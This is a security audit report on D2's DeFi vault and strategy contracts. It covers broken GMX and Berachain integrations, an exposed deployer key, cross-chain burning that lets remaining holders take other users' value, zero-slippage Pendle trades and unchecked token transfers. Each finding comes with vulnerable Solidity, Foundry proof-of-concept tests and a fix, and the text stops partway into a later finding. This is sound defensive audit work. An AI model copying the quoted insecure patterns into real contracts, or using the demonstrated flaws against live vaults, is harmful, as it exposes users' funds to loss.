------ FILE START car/reports_md/2025-02-24-cyfrin-d2-v2.1.md ------

**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)

**Assisting Auditors**

[Immeas](https://twitter.com/0ximmeas)


---

# Findings
## Critical Risk


### `GMXV2_Module` withdrawal functionality is broken due to missing callback implementation

**Description:** The `GMXV2_Module` contract's withdrawal functionality is broken because it sets itself (**`address(this)`**) as the callback contract for GMX V2 withdrawals without implementing the required callback interface. This causes all withdrawal transactions to revert, effectively locking user funds in the protocol.

```solidity
function gmxv2_withdraw(
    address market,
    uint256 executionFee,
    uint256 amount,
    uint256 minLongOut,
    uint256 minShortOut
) external payable onlyRole(EXECUTOR_ROLE) nonReentrant {
    IExchangeRouter.CreateWithdrawalParams memory params = IExchangeRouter.CreateWithdrawalParams({
        receiver: address(this),
        callbackContract: address(this),  // @audit - Setting callback without implementation
        // ...
    });
    // ...
}
```

According to GMX V2's documentation and source code, when a callback contract is specified, it must implement two critical functions:

1. `afterWithdrawalExecution(bytes32, WithdrawalUtils.Props, EventUtils.EventLogData)`
2. `afterWithdrawalCancellation(bytes32, WithdrawalUtils.Props)`

These callbacks are enforced by GMX's `ExecuteWithdrawalUtils.sol`:

```solidity
// In ExecuteWithdrawalUtils.sol
function executeWithdrawal(...) {
    // ... other code ...
    CallbackUtils.afterWithdrawalExecution(params.key, withdrawal, eventData);
    // ... other code ...
}

// In CallbackUtils.sol
function afterWithdrawalExecution(...) internal {
    if (withdrawal.callbackContract() != address(0)) {
        IWithdrawalCallbackReceiver(withdrawal.callbackContract()).afterWithdrawalExecution(
            key,
            withdrawal,
            eventData
        );
    }
}
```


**Impact:** This issue completely breaks a core protocol function. It has severe implications:

- **Complete loss of functionality**: All withdrawal transactions through `gmxv2_withdraw` will revert, making it impossible for users to withdraw their funds.
- **Loss of funds**: User funds become locked in the protocol.



**Proof of Concept:** We've created a test that demonstrates this issue:

```solidity
function test_gmxv2_withdraw_RevertGivenMissingCallback() public {
        // First make a deposit to get market tokens
        uint256 depositAmount = 1e18;
        deal(WETH_ADDRESS, address(strategy), depositAmount);
        vm.prank(address(strategy));
        _weth.approve(GMX_DEPOSIT_VAULT, depositAmount);

        // Store initial balance
        uint256 initialExecutorBalance = EXECUTOR.balance;

        // Get market info before deposit
        IMarket.Props memory marketInfo = IReader(GMX_READER).getMarket(GMX_DATASTORE, GMX_WETH_MARKET);
        address marketToken = marketInfo.marketToken;

        // Execute deposit
        vm.prank(EXECUTOR);
        _gmx.gmxv2_deposit{value: 0.1 ether}(
            GMX_WETH_MARKET,
            0.1 ether,  // execution fee
            depositAmount,
            0,          // no short token
            0           // min out
        );

        // Deal market tokens to the vault first before simulating keeper execution
        deal(marketToken, GMX_DEPOSIT_VAULT, depositAmount);

        // ============ KEEPER SIMULATION - DEPOSIT EXECUTION ============
        // In production: GMX keeper would execute this step
        // Here we simulate the keeper minting market tokens to the strategy
        vm.prank(GMX_DEPOSIT_VAULT);
        IERC20(marketToken).transfer(address(strategy), depositAmount); // Simulate market tokens being minted
        // ============ END KEEPER SIMULATION - DEPOSIT EXECUTION ============

        // Get market token balance after deposit
        uint256 marketTokenBalance = IERC20(marketToken).balanceOf(address(strategy));

        require(marketTokenBalance > 0, "No market tokens received from deposit");

        // Approve market tokens for withdrawal
        vm.prank(address(strategy));
        IERC20(marketToken).approve(GMX_WITHDRAW_VAULT, depositAmount);

        // Now attempt to withdraw
        vm.prank(EXECUTOR);
        _gmx.gmxv2_withdraw{value: 0.1 ether}(
            GMX_WETH_MARKET,
            0.1 ether,  // execution fee
            depositAmount,
            0,          // min long out
            0           // min short out
        );

        // Deal WETH to the withdraw vault before simulating keeper execution
        deal(WETH_ADDRESS, GMX_WITHDRAW_VAULT, depositAmount * 2); // Ensure vault has enough WETH

        // First give market tokens to the strategy
        deal(marketToken, address(strategy), depositAmount);

        // ============ KEEPER SIMULATION - WITHDRAWAL EXECUTION ============
        // In production: GMX keeper would:
        // 1. Burn market tokens
        // 2. Return WETH
        // 3. Call the callback contract (if set) with afterWithdrawalExecution
        // Here we simulate steps 1 and 2 manually:
        vm.startPrank(GMX_WITHDRAW_VAULT);
        // Step 1: Burn market tokens (transfer them to withdraw vault)
        IERC20(marketToken).transferFrom(address(strategy), GMX_WITHDRAW_VAULT, depositAmount);
        // Step 2: Return WETH to strategy
        IERC20(WETH_ADDRESS).transfer(address(strategy), depositAmount);
        vm.stopPrank();
        // Note: Step 3 (callback) is not simulated as we're bypassing GMX's actual execution
        // ============ END KEEPER SIMULATION - WITHDRAWAL EXECUTION ============


        // Verify executor spent the execution fees
        assertEq(
            EXECUTOR.balance,
            initialExecutorBalance - 0.2 ether, // 0.1 for deposit + 0.1 for withdrawal
            "Executor should have spent 0.2 ETH for execution fees"
        );
    }
```

The test passes, but this is misleading because we're manually simulating the keeper's actions. In production, according to [GMX V2's documentation](https://github.com/gmx-io/gmx-synthetics#withdrawal-notes), withdrawals require specific callback handling:

> "Ensure only handlers with the CONTROLLER role can call the afterWithdrawalExecution and afterWithdrawalCancellation callback functions"

This indicates that GMX V2 expects contracts interacting with withdrawals to implement these callback functions. When our contract attempts a withdrawal in production:
1. The keeper will attempt to call `afterWithdrawalExecution` on our contract
2. Since we don't implement this interface, the transaction will revert
3. The withdrawal will fail, leaving user funds stuck in the protocol

Our test passes only because we're bypassing GMX's actual withdrawal execution by manually simulating the token transfers, which skips the mandatory callback mechanism.

**Recommended Mitigation:** There are two possible fixes:

**Option 1: Remove Callback (Recommended)**
If no post-withdrawal processing is needed:

```solidity
IExchangeRouter.CreateWithdrawalParams memory params = IExchangeRouter.CreateWithdrawalParams({
    receiver: address(this),
    callbackContract: address(0),  // Set to zero address to skip callbacks
    // ...
});
```

**Option 2: Implement Callback Interface**
If post-withdrawal processing is required, implement the IWithdrawalCallbackReceiver interface:

```solidity
contract GMXV2_Module is IGMXV2_Module, IWithdrawalCallbackReceiver {
    function afterWithdrawalExecution(
        bytes32 key_,
        WithdrawalUtils.Props memory withdrawal_,
        EventUtils.EventLogData memory eventData_
    ) external {
        // Add post-withdrawal logic
    }

    function afterWithdrawalCancellation(
        bytes32 key_,
        WithdrawalUtils.Props memory withdrawal_
    ) external {
        // Add cancellation logic
    }
}
```

We recommend Option 1 (removing the callback) unless there's a specific need for post-withdrawal processing, as it's simpler and requires less gas.


**D2:** Fixed in [`37df474`](https://github.com/d2sd2s/d2-contracts/commit/37df474519e033f01939df7dfef55ad3370bd26d)

**Cyfrin:** Verified.


### `PRIVATE_KEY` exposed in `makefile` file and other sensitive data

**Description:** The project's Makefile contains hardcoded sensitive credentials including:

- A private key used for contract deployments
- Multiple RPC endpoint URLs with API keys
- Several Etherscan API keys for different networks

**Impact:** Although no customer funds were at risk and the deployer key had no admin rights on any of the deployed strategies, this exposure is critical because:

1. The private key grants complete control over the associated address, including:
    - Full access to any funds held by the wallet
    - Impersonate the protocol and deploy fake vaults
2. The RPC endpoints could be used to:
    - Execute unauthorized API calls
    - Potentially incur costs to the project
    - Exceed rate limits affecting production services

**Recommended Mitigation:** Immediate Actions Required:
- Remove all exposed credentials immediately
- Transfer any assets from the compromised address
- Revoke any contract permissions from the address
- Regenerate all API keys

Future mitigation use methods in this Updraft [lesson](https://updraft.d2sd2s.io/courses/foundry/foundry-simple-storage/never-use-a-env-file?lesson_format=video) to safely store private keys.

**D2:** Fixed in [`a4f3517`](https://github.com/d2sd2s/d2-contracts/commit/a4f3517d7c410278c1703b89aaad2315b5b86ba7) and [`228d0e17`](https://github.com/d2sd2s/d2-contracts/commit/228d0e17a1574d704380c3106a8d0caf6143ffd7)

**Cyfrin:** Verified.

\clearpage
## High Risk


### Users may lose value when transferring ERC-4626 Vault tokens cross-chain

**Description:** Both the `VaultV0` and `VaultV3` ERC-4626 tokens are designed to be transferable across chains and therefore implement the LayerZero cross-chain OFT standard.

When a token is transferred cross-chain, the `_debit` function is called to determine how the token should be "removed" from the source chain. The two standard approaches for this are **Lock/Unlock** and **Mint/Burn**. Both `VaultV0` and `VaultV3` implement the **Mint/Burn** approach, as seen in [`VaultV0::_debit` and `VaultV0::_credit`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/VaultV0.sol#L384-L393) (with an identical implementation in [`VaultV3`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/VaultV3.sol#L321-L330)):

```solidity
function _debit(address _from, uint256 _amountLD, uint256 _minAmountLD, uint32 _dstEid) internal virtual override returns (uint256 amountSentLD, uint256 amountReceivedLD) {
    (amountSentLD, amountReceivedLD) = _debitView(_amountLD, _minAmountLD, _dstEid);
    _burn(_from, amountSentLD);
}

function _credit(address _to, uint256 _amountLD, uint32) internal virtual override returns (uint256 amountReceivedLD) {
    if (_to == address(0x0)) _to = address(0xdead);
    _mint(_to, _amountLD);
    return _amountLD;
}
```

However, this approach is problematic for ERC-4626 vaults because `_burn` reduces the `totalSupply`. Since share value is calculated as `assets / totalSupply`, transferring tokens to another chain increases the share value of stakers who still have their tokens on the vault's original chain. This means that if these stakers withdraw, they will receive a portion of the assets that originally belonged to users who transferred their tokens cross-chain.

**Impact:** Cross-chain transfers distort the vaults share value. Users who transfer their tokens risk losing part or all of their value if other users withdraw while their tokens are still in transit.

**Proof of Concept:** The following test shows the issue, a similar test was written for `VaultV3`:
```solidity
function test_vaultV0_xchain_transfer_affects_vault_exchange_rate() public {
    deal(address(asset), DEPOSITOR, 2e18);

    // 1. Bob and Alice both participate in the vault
    vm.startPrank(DEPOSITOR);
    asset.approve(address(vault), 2e18);
    vault.deposit(1e18, ALICE);
    vault.deposit(1e18, BOB);
    assertEq(vault.balanceOf(ALICE), 1e18);
    assertEq(vault.balanceOf(BOB), 1e18);
    vm.stopPrank();

    // 2. Share price is not 1 to 1
    assertEq(vault.previewRedeem(1e18), 1e18);

    SendParam memory sendParam;
    sendParam.to = bytes32(uint256(1));
    sendParam.amountLD = 1e18;

    MessagingFee memory fee;

    // 3. Bob transfers his share to another chain
    vm.prank(BOB);
    vault.send(sendParam, fee, BOB);

    // Since the share is burnt on the source chain, share price has increased
    assertEq(vault.previewRedeem(1e18), 2e18);

    // 4. Alice redeems her share, getting Bobs share as well
    vm.prank(ALICE);
    vault.redeem(1e18,ALICE, ALICE);

    assertEq(vault.balanceOf(ALICE), 0);
    assertEq(asset.balanceOf(ALICE), 2e18);

    Origin memory origin;
    origin.sender = bytes32(uint256(1));
    (bytes memory message,) = OFTMsgCodec.encode(
        bytes32(uint256(uint160(BOB))),
        1e6,
        ""
    );

    // 5. Bob transfers back
    vm.prank(LZ_ENDPOINT);
    vault.lzReceive(
        origin,
        bytes32(uint256(0)),
        message,
        LZ_ENDPOINT,
        ""
    );

    // Bobs share is now worth nothing as Alice has redeemed it
    assertEq(vault.balanceOf(BOB), 1e18);
    assertEq(vault.previewRedeem(1e18), 0);

    vm.prank(BOB);
    vm.expectRevert("ZERO_ASSETS");
    vault.redeem(1e18, BOB, BOB);
}
```

**Recommended Mitigation:** Consider using the **Lock/Unlock** approach and custody the funds in the vault when transferred:
```solidity
function _debit(address _from, uint256 _amountLD, uint256 _minAmountLD, uint32 _dstEid) internal virtual override returns (uint256 amountSentLD, uint256 amountReceivedLD) {
    (amountSentLD, amountReceivedLD) = _debitView(_amountLD, _minAmountLD, _dstEid);
    // Instead of burning, transfer to this contract
    _transfer(_from, address(this), amountSentLD);
}

function _credit(address _to, uint256 _amountLD, uint32) internal virtual override returns (uint256 amountReceivedLD) {
    if (_to == address(0x0)) _to = address(0xdead);
    _transfer(address(this),_to, _amountLD);
    return _amountLD;
}
```

**D2:** Fixed in [`21f2dd1`](https://github.com/d2sd2s/d2-contracts/commit/21f2dd1bd0c613b51cadeb5feafa58ed5ad02b6e) and [`902a14b`](https://github.com/d2sd2s/d2-contracts/commit/902a14bb4ab3a036b286253bd68f57f581c2a2d2)

**Cyfrin:** Verified.


### Reward claiming fails for Berachain RewardVaults due to incorrect interface

**Description:** D2 plans to deploy on the newly launched Berachain, which operates on a novel [Proof-of-Liquidity](https://docs.berachain.com/learn/what-is-proof-of-liquidity) model. On Berachain, liquidity providers can stake their LP tokens in [Reward Vaults](https://docs.berachain.com/developers/contracts/reward-vault) to earn `$BGT`, the Berachain Governance Token.

To facilitate staking and withdrawals, the D2 [`Bera_Module`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Bera.sol) includes the functions [`Bera_Module::bera_vault_stake`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Bera.sol#L66-L68) and [`Bera_Module::bera_vault_withdraw`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Bera.sol#L70-L72). To claim `$BGT` rewards, the [`Bera_Module::bera_vault_get_reward`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Bera.sol#L74-L76) function is used:

```solidity
function bera_vault_get_reward(address token) external onlyRole(EXECUTOR_ROLE) nonReentrant {
    IVault(vaultFactory.getVault(token)).getReward(address(this));
}
```

However, the interface used for [`IVault::getReward`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Bera.sol#L221) is incorrect:

```solidity
function getReward(address account) external;
```

In Berachains [`RewardVault::getReward`](https://github.com/berachain/contracts/blob/main/src/pol/rewards/RewardVault.sol#L318-L321) and as deployed on-chain, the correct function signature is:

```solidity
function getReward(
    address account,
    address recipient
)
```

Due to this discrepancy, any call to `Bera_Module::bera_vault_get_reward` will revert, preventing `$BGT` rewards from being claimed.

**Impact:** The `$BGT` rewards, which are a core incentive of Berachain's Proof-of-Liquidity model, cannot be claimed. This reduces the protocol's ability to effectively participate in Berachains reward system. Additionally, since these rewards contribute to the protocol's overall earnings.

**Proof of Concept:** The following test highlights the issue:
```solidity
function test_bera_vault_get_reward() public {
    deal(USDCe_HONEY_STABLE_ADDRESS, address(strategy), 1e18);

    vm.startPrank(EXECUTOR);
    trader.approve(USDCe_HONEY_STABLE_ADDRESS, USDCe_HONEY_STABLE_VAULT, 1e18);
    bera.bera_vault_stake(USDCe_HONEY_STABLE_ADDRESS, 1e18);

    assertEq(RewardVault(USDCe_HONEY_STABLE_VAULT).balanceOf(address(strategy)), 1e18);

    vm.warp(block.timestamp + 1 days);

    // there are rewards to be claimed
    assertGt(RewardVault(USDCe_HONEY_STABLE_VAULT).earned(address(strategy)), 0);

    // rewards cannot be claimed due to the interface definition being wrong
    vm.expectRevert();
    bera.bera_vault_get_reward(USDCe_HONEY_STABLE_ADDRESS);

    vm.stopPrank();
}
```

**Recommended Mitigation:** Consider adding the extra parameter to the interface and call it with `address(this)`:
```diff
-   IVault(vaultFactory.getVault(token)).getReward(address(this));
+   IVault(vaultFactory.getVault(token)).getReward(address(this), address(this));
```

**D2:** Fixed in [`92303a6`](https://github.com/d2sd2s/d2-contracts/commit/92303a61653ff5564df0c143afcd7298e14a33b9)

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### Lack of slippage protection allows exploitation of Pendle trades

**Description:** The [`Pendle_Module`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol) is designed to interact with the Pendle protocol. [Pendle](https://pendle.finance/) is a permissionless yield-trading protocol that enables users to execute various yield-management strategies. It utilizes a complex system of different token types`PT`, `YT`, and `SY`to facilitate trading across different components of yield.

Within Pendle, users can deposit assets to receive these tokens and subsequently swap between them. The `Pendle_Module` facet implements these functionalities.

The issue, however, is that slippage protection is completely absent, as the slippage parameters are hardcoded to `0` in multiple functions:
* [`Pendle_Module::pendle_deposit`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L35-L74), [L69](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L69):
  ```solidity
  router.addLiquiditySingleToken(
      address(this),
      address(market),
      0, // @audit `minLpOut` hardcoded to 0
      approxParams,
      input,
      limitOrderData
  );
  ```
* [`Pendle_Module::pendle_withdraw`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L76-L107), [L86](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L86):
  ```solidity
  IPRouter.TokenOutput memory output = IPRouter.TokenOutput({
      tokenOut: ast,
      minTokenOut: 0, // @audit `minTokenOut` hardcoded to 0
      tokenRedeemSy: ast,
      pendleSwap: address(0),
      swapData: swapData
  });
  ```
* [`Pendle_Module::pendle_swap`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L109-L188), [L140](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L140), [L150](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L150) and [L170](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L170):
  ```solidity
  IPRouter.TokenOutput memory output = IPRouter.TokenOutput({
      tokenOut: ast,
      minTokenOut: 0, // @audit `minTokenOut` hardcoded to 0
      tokenRedeemSy: ast,
      pendleSwap: address(0),
      swapData: swapData
  });
  ```
  ```solidity
  router.swapExactTokenForPt(
      address(this),
      market,
      0, // @audit `minPtOut` hardcoded to 0
      approxParams,
      input,
      limitOrderData
  );
  ```
  ```solidity
  router.swapExactTokenForYt(
      address(this),
      market,
      0, // @audit `minYtOut` hardcoded to 0
      approxParams,
      input,
      limitOrderData
  );
  ```
* [`Pendle_Module::pendle_claim`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L190-L200), [L197](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L197):
  ```solidity
  IPSY(sy).redeem(
      address(this),
      IERC20(sy).balanceOf(address(this)),
      IPSY(sy).getTokensOut()[0],
      0, // @audit `minTokenOut` is hardcoded to 0
      false
  );
  ```
* [`Pendle_Module::pendle_exit`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L202-L227), [L216](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L216):
  ```solidity
  router.exitPostExpToToken(
      address(this),
      market,
      amount,
      amountLp,
      IPRouter.TokenOutput({
          tokenOut: asset,
          minTokenOut: 0, // @audit `minTokenOut` hardcoded to 0
          tokenRedeemSy: asset,
          pendleSwap: address(0),
          swapData: IPSwapAggregator.SwapData({
              swapType: IPSwapAggregator.SwapType.NONE,
              extRouter: address(0),
              extCalldata: "",
              needScale: false
          })
      })
  );
  ```
Since all these functions allow transactions with zero slippage protection, they may be exploited by MEV bots causing value loss for the stakers in D2.

**Impact:** The absence of slippage protection exposes the protocol to front-running and price manipulation. Attackers can take advantage of these hardcoded zero values to extract value from trades at the expense of D2s stakers, leading to potential financial losses.


**Recommended Mitigation:** Consider allowing the trader to provide `minAmountOut` in the calls.


**D2:** Fixed in [`cd7058d`](https://github.com/d2sd2s/d2-contracts/commit/cd7058d32ef80fa274851117ee8e5868ec52cc5b)

**Cyfrin:** Verified.


### Unsafe token transfers in `VaultV3` can lead to state inconsistencies

**Description:** The`VaultV3`contract doesn't validate the success of token transfers in both`custodyFunds()` and`returnFunds()`functions. State changes occur before or regardless of transfer success, which can lead to vault state inconsistencies.

```solidity
function custodyFunds() external onlyTrader notCustodied duringEpoch returns (uint256) {
    uint256 amount = totalAssets();
    require(amount > 0, "!amount");
    custodied = true;
    custodiedAmount = amount;
    IERC20(asset()).transfer(trader, amount); // No success validation
    emit FundsCustodied(epochId, amount);
    return amount;
}

function returnFunds(uint256 _amount) external onlyTrader {
    require(custodied, "!custody");
    require(_amount > 0, "!amount");
    IERC20(asset()).transferFrom(trader, address(this), _amount); // No success validation
    epoch.epochEnd = uint80(block.timestamp);
    custodied = false;
    emit FundsReturned(currentEpoch, _amount);
}

```

**Impact:** Even with a trusted trader, several non-malicious scenarios can trigger this issue:

1. Token transfers being temporarily paused (e.g., USDC during SVB crisis)
2. Missing or insufficient allowances for transferFrom
3. Token blacklisting or transfer limits
4. Token implementations that return false instead of reverting

When triggered, this can lead to:

- Vault becoming stuck in custodied state
- Incorrect epoch transitions
- Mismatched accounting of assets
- Temporary locking of user funds
- Need for manual governance intervention

**Recommended Mitigation:** Use OpenZeppelin's SafeERC20 library and follow the Checks-Effects-Interactions pattern:

```solidity
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract VaultV3 {
    using SafeERC20 for IERC20;

    function custodyFunds() external onlyTrader notCustodied duringEpoch returns (uint256) {
        uint256 amount = totalAssets();
        require(amount > 0, "!amount");
        custodied = true;
        custodiedAmount = amount;
        IERC20(asset()).safeTransfer(trader, amount);
        emit FundsCustodied(epochId, amount);
        return amount;
    }

    function returnFunds(uint256 _amount) external onlyTrader {
        require(custodied, "!custody");
        require(_amount > 0, "!amount");
        epoch.epochEnd = uint80(block.timestamp);
        custodied = false;
        IERC20(asset()).safeTransferFrom(trader, address(this), _amount);
        emit FundsReturned(currentEpoch, _amount);
    }
}

```

**D2:** Fixed in [`e54eb5b`](https://github.com/d2sd2s/d2-contracts/commit/e54eb5b44e0407b367a8be16d8986c9456b8bc1e)

**Cyfrin:** Verified.


### Incorrect `chainid` prevents correct Strategy deployment on Berachain

**Description:** The Strategy contract includes a special configuration specifying which facets should be used for different chains. However, the `chainid` assigned to Berachain is incorrect, as seen in  [`Strategy::constructor`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/Strategy.sol#L25-L337), [L216](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/Strategy.sol#L216):
```solidity
} else if (block.chainid == 80000) { // @audit Berachain id is 80094
```
According to the [official documentation](https://docs.berachain.com/developers/network-configurations), the correct `chainid` for Berachain is `80094`, not `80000`.

**Impact:** Facets intended for deployment on Berachain will not be correctly initialized until a new Strategy contract is deployed with the corrected `chainid`. This prevents the expected functionality from being executed on Berachain.

**Recommended Mitigation:** Consider changing `chainid` to `80094`:
```diff
- } else if (block.chainid == 80000) {
+ } else if (block.chainid == 80094) {
```

**D2:** Fixed in commit [`ab5b852`](https://github.com/d2sd2s/d2-contracts/commit/ab5b85264dd7fcacc4afc5e146427428b3f6f719)

**Cyfrin:** Verified.


### Incorrect interface for `ExchangeRouter::updateOrder` prevents order updates in GMX V2

**Description:** There is an issue in the integration with the GMX V2 trading platform, specifically in the [`GMX_Module::gmxv2_update`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/GMXV2.sol#L140-L148) function:
```solidity
function gmxv2_update(
    bytes32 key,
    uint256 sizeDeltaUsd,
    uint256 acceptablePrice,
    uint256 triggerPrice,
    uint256 minOutputAmount
) external onlyRole(EXECUTOR_ROLE) nonReentrant {
    exchangeRouter.updateOrder(key, sizeDeltaUsd, acceptablePrice, triggerPrice, minOutputAmount);
}
```

The issue arises from an incorrect interface definition for [`ExchangeRouter::updateOrder`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/GMXV2.sol#L383-L389):

```solidity
function updateOrder(
    bytes32 key,
    uint256 sizeDeltaUsd,
    uint256 acceptablePrice,
    uint256 triggerPrice,
    uint256 minOutputAmount
) external payable;
```

However, the actual function signature used by GMX in its [`ExchangeRouter`](https://arbiscan.io/address/0x900173a66dbd345006c51fa35fa3ab760fcd843b#code) is:

```solidity
function updateOrder(
    bytes32 key,
    uint256 sizeDeltaUsd,
    uint256 acceptablePrice,
    uint256 triggerPrice,
    uint256 minOutputAmount,
    uint256 validFromTime,
    bool autoCancel
) external payable nonReentrant {
```

The discrepancy between the expected and actual function signatures means that calls to `GMX_Module::gmxv2_update` will always revert due to missing parameters.

**Impact:** The `gmxv2_update` function is non-functional and will always revert, preventing order updates. While this issue can be circumvented by closing and reopening positions, this workaround is inefficient and leads to unnecessary transaction costs.

**Proof of Concept:** The following test highlights the issue:
```solidity
function test_gmxv2_update_SucceedGivenValidOrder() public {
    // First create a long position
    uint256 collateralAmount = 1e18;
    uint256 sizeDeltaUsd = 10000e30;
    uint256 initialTriggerPrice = 2500e30;  // Current ETH price
    uint256 initialAcceptablePrice = 2400e30;  // Lower than trigger price for market long (willing to pay up to this price)
    uint256 initialMinOutputAmount = 0.9e18;
    uint256 executionFee = 0.1 ether;

    // Deal WETH to the strategy
    deal(WETH_ADDRESS, address(strategy), collateralAmount);

    // Create the order
    vm.prank(address(strategy));
    _weth.approve(GMX_ORDER_VAULT, collateralAmount);

    vm.recordLogs();
    // Create a market increase order
    vm.prank(EXECUTOR);
    _gmx.gmxv2_create{value: executionFee}(
        GMX_WETH_MARKET,
        WETH_ADDRESS,
        new address[](0), // No swap path
        IExchangeRouter.OrderType.LimitIncrease,
        IExchangeRouter.DecreasePositionSwapType.NoSwap,
        true, // isLong
        sizeDeltaUsd,
        collateralAmount,
        initialTriggerPrice,
        initialAcceptablePrice,
        initialMinOutputAmount,
        executionFee
    );
    Vm.Log[] memory entries = vm.getRecordedLogs();

    // Get the order key
    bytes32 key = entries[5].topics[2];

    // Wait for a few blocks to ensure order is ready
    vm.warp(block.timestamp + 1 hours);
    vm.roll(block.number + 100);

    // New parameters for the update
    uint256 newSizeDeltaUsd = 20000e30;
    uint256 newAcceptablePrice = 2200e30;
    uint256 newTriggerPrice = 2050e30;
    uint256 newMinOutputAmount = 0.95e18;

    // Record initial executor balance
    uint256 initialBalance = EXECUTOR.balance;

    // Update the order
    // This will fail because the interface used is not the correct one
    vm.prank(EXECUTOR);
    _gmx.gmxv2_update(
        key,
        newSizeDeltaUsd,
        newAcceptablePrice,
        newTriggerPrice,
        newMinOutputAmount
    );

    // Verify the executor spent the correct amount of ETH for execution fees
    assertEq(
        EXECUTOR.balance,
        initialBalance,
        "Executor balance should not change for updates"
    );
}
```

**Recommended Mitigation:** Consider changing the interface and adding the extra parameters to the call.

**D2:** Fixed in [`23a48bc`](https://github.com/d2sd2s/d2-contracts/commit/23a48bc981540f66cb853857b9888373058a4930)

**Cyfrin:** Verified.


### `Bera_Module` fails to stake in `BGTStaker` due to missing Boost integration

**Description:** The D2 Berachain integration includes two functions, [`Bera_Module::bera_bgt_stake`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Bera.sol#L54-L56) and [`Bera_Module::bera_bgt_withdraw`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Bera.sol#L58-L60). These functions attempt to interact with [`BGTStaker::stake`](https://github.com/berachain/contracts/blob/main/src/pol/BGTStaker.sol#L93-L96) and [`BGTStaker::withdraw`](https://github.com/berachain/contracts/blob/main/src/pol/BGTStaker.sol#L98-L101), respectively.

However, both `BGTStaker::stake` and `BGTStaker::withdraw` can only be called by the `BGT` token contract itself, as enforced by the [`onlyBGT`](https://github.com/berachain/contracts/blob/main/src/pol/BGTStaker.sol#L58-L62) modifier:

```
/// @dev Throws if called by any account other than BGT contract.
modifier onlyBGT() {
    if (msg.sender != address(stakeToken)) NotBGT.selector.revertWith();
    _;
}
...

function stake(address account, uint256 amount) external onlyBGT {
    _stake(account, amount);
}
```

To stake in `BGTStaker`, a user must use the **boost functionality** on the `BGT` token. This involves:
1. Calling [`BGT::queueBoost`](https://github.com/berachain/contracts/blob/main/src/pol/BGT.sol#L216-L227) and [`BGT::activateBoost`](https://github.com/berachain/contracts/blob/main/src/pol/BGT.sol#L241-L266) to boost a verifier.
2. Calling [`BGT::queueDropBoost`](https://github.com/berachain/contracts/blob/main/src/pol/BGT.sol#L268-L276) and [`BGT::dropBoost`](https://github.com/berachain/contracts/blob/main/src/pol/BGT.sol#L285-L306) to exit the boost.

More details about boosting verifiers can be found in the Berachain [documentation](https://docs.berachain.com/learn/pol/tokens/bgt#boosting-validators-incentives).

**Impact:** The protocol will not be able to earn `$BGT` rewards from `BGTStaker` as intended. To access these rewards, it must integrate with the boost functionality of the `BGT` token instead of calling `BGTStaker` directly. This oversight could result in missed staking incentives, reducing the protocol's overall earnings.

**Recommended Mitigation:** Consider implementing the boost functionality on the BGT token

**D2:** Fixed in [`11c9407`](https://github.com/d2sd2s/d2-contracts/commit/11c9407644df2830f562cc60f4e0bfc1263459d3)

**Cyfrin:** Verified.


### `Bera_Module::bera_kodiakv3_swap` broken due to `deadline` parameter

**Description:** The function `Bera_Module::bera_kodiakv3_swap` calls Kodiak's `SwapRouter02::exactInput` (which is similar to Uniswap V3) to execute a swap:
```solidity
function bera_kodiakv3_swap(address token, uint amount, uint amountMin, bytes calldata path) external onlyRole(EXECUTOR_ROLE) nonReentrant {
    validateToken(token);
    IERC20(token).approve(address(kodiakv3swap), amount);
    kodiakv3swap.exactInput(IKodiakV3.ExactInputParams({
        path: path,
        recipient: address(this),
        deadline: type(uint256).max,
        amountIn: amount,
        amountOutMinimum: amountMin
    }));
}
```
